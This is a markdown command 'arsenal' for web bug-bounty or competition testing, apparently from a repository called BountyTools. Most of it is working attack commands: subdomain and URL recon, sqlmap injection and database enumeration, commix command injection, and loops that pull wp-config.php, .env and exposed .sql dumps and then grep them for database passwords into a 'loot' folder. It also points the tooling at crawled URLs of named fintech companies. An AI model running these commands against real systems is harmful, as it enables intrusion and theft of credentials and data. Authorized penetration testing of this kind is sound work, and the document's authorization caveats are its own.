# Competition arsenal (`$TARGET` / `$DOMAIN`)

Authorized competition and program assets only. Replace placeholders before running.

```bash
export TARGET="https://COMPETITION_HOST"
export DOMAIN="$(echo "$TARGET" | sed -E 's#^https?://##' | cut -d/ -f1)"
export OUT="$HOME/ops/$DOMAIN"
mkdir -p "$OUT"/{recon,urls,live,fuzz,inj,ssl,evidence,loot,wordlists}
```

## Generated deck (1000+ lines)

Regenerate locally:

```bash
python3 scripts/generate_competition_commands.py
```

Output: [`docs/generated/competition_commands_1000.txt`](generated/competition_commands_1000.txt) — katana, subfinder, gau, httpx, nuclei, sqlmap, commix, sstimap, xsstrike, ffuf, feroxbuster, dirb, hydra, medusa, sslscan, sslyze, nmap, naabu, wpscan, searchsploit, msf auxiliary one-liners, grep pipelines, and **evidence extraction** commands.

## Core chains

```bash
subfinder -d "$DOMAIN" -silent | dnsx -silent | httpx -silent -status-code -title -tech-detect | tee "$OUT/live/pd_chain.txt"
gau "$DOMAIN" | uro | tee "$OUT/urls/gau_clean.txt"
katana -u "$TARGET" -d 2 -jc -o "$OUT/urls/katana.txt"
gau "$DOMAIN" | grep -Ei 'wp-config|\.sql|admin|api|graphql|\.env|backup' | sort -u | httpx -mc 200,301,302,403,500 | tee "$OUT/live/high_value.txt"
```

```bash
grep -Ei '\?[^=]+=' "$OUT/urls/gau_clean.txt" | grep -Ei '(id|user|order|search|q|page)=' | sort -u > "$OUT/urls/fruitful.txt"
sqlmap -m "$OUT/urls/fruitful.txt" --batch --smart --level=2 --risk=1 --random-agent
```

## Extraction & evidence (report-ready loot)

Use only to prove impact per competition rules. Redact secrets before publishing.

### Directory layout

```bash
mkdir -p "$OUT/loot"/{http,configs,sqlmeta,grep,archives}
```

### HTTP body capture

```bash
httpx -l "$OUT/live/high_value.txt" -json -o "$OUT/loot/httpx.json"
while read -r u; do
  hash=$(printf '%s' "$u" | md5sum | cut -d' ' -f1)
  curl -sS -m 20 "$u" -o "$OUT/loot/http/${hash}.body"
done < "$OUT/live/high_value.txt"
```

### WordPress / config extraction

```bash
for p in wp-config.php wp-config.php.bak wp-config.txt .env debug.log; do
  curl -sS -o "$OUT/loot/configs/$p" "$TARGET/$p"
done
grep -RinE 'DB_NAME|DB_USER|DB_PASSWORD|DB_HOST|table_prefix' "$OUT/loot/configs/" | tee "$OUT/loot/grep/db_defs.txt"
```

### SQLMap metadata (minimal proof, not full dumps unless rules allow)

```bash
sqlmap -u "$TARGET/page?id=1" -p id --batch --banner --current-user --current-db --is-dba 2>&1 | tee "$OUT/loot/sqlmeta/banner.txt"
sqlmap -u "$TARGET/page?id=1" -p id --batch --count -D information_schema 2>&1 | tee "$OUT/loot/sqlmeta/count.txt"
```

### Grep mined URLs

```bash
grep -Ei '\.sql(\?|$)|database\.sql|dump\.sql' "$OUT/urls/gau_clean.txt" | while read -r u; do
  base=$(basename "$u" | tr '/?&=' '_')
  curl -sS "$u" -o "$OUT/loot/archives/$base"
done
```

### Package evidence for submit

```bash
tar -czf "$OUT/evidence/submission_$(date +%Y%m%d_%H%M).tar.gz" \
  -C "$OUT" evidence loot/httpx.json loot/grep \
  --exclude='loot/http/*.body'
```

### JSON flatten for triage

```bash
jq -r '[.url, .status_code, .title] | @tsv' "$OUT/loot/httpx.json" 2>/dev/null | tee "$OUT/loot/httpx_flat.tsv"
```

## Tool index (standalone)

| Tool | Command |
|------|---------|
| katana | `katana -u "$TARGET" -d 2 -jc -o "$OUT/urls/katana.txt"` |
| subfinder | `subfinder -d "$DOMAIN" -all -o "$OUT/recon/subs.txt"` |
| gau | `gau "$DOMAIN" \| sort -u > "$OUT/urls/gau.txt"` |
| dirb | `dirb "$TARGET" /usr/share/wordlists/dirb/common.txt` |
| commix | `commix -u "$TARGET?cmd=id" --batch` |
| sstimap | `sstimap -u "$TARGET"` |
| xsstrike | `python3 xsstrike.py -u "$TARGET?q=1"` |
| sslscan | `sslscan "$DOMAIN"` |
| sslyze | `sslyze "$DOMAIN" --regular` |
| searchsploit | `searchsploit wordpress` |
| linpeas | `bash linpeas.sh` (on authorized shells only) |

## `inspect.txt` triage (thetshas `master/inspect.txt`)

URL dumps from crawls (e.g. Bitso/Robinhood asset links) must be filtered before testing. **Only probe hosts your program authorizes.**

```bash
export INSPECT_FILE="/path/to/thetshas/master/inspect.txt"
python3 scripts/analyze_inspect_urls.py "$INSPECT_FILE" -o docs/generated
bash docs/generated/inspect_critical_commands.sh
```

Critical buckets written:

| File | Role |
|------|------|
| `inspect_critical_api.txt` | `/api/`, versioned API paths |
| `inspect_critical_auth.txt` | login, oauth, session |
| `inspect_critical_fintech.txt` | wallet, transfer, ticker, transaction |
| `inspect_critical_params.txt` | URLs with query parameters |
| `inspect_critical_encoding.txt` | `%5C`, `\u003` path anomalies |
| `inspect_critical_cloudflare.txt` | `cdn-cgi/challenge` noise / WAF |
| `inspect_critical_commands.sh` | httpx, nuclei, sqlmap, dalfox, loot grep |

See `inspect_summary.txt` for host counts. Social/CDN hosts (LinkedIn, YouTube, etc.) are skipped unless `--include-third-party`.

Regenerate the main command deck after triage:

```bash
python3 scripts/generate_competition_commands.py
```

## Not included

Phishing campaigns, Wi-Fi captive portals, unauthorized mass credential stuffing, and automatic takeover frameworks against third-party production systems are out of band for this deck. Use competition rules and human judgment.

---

dntaskmehow · BountyTools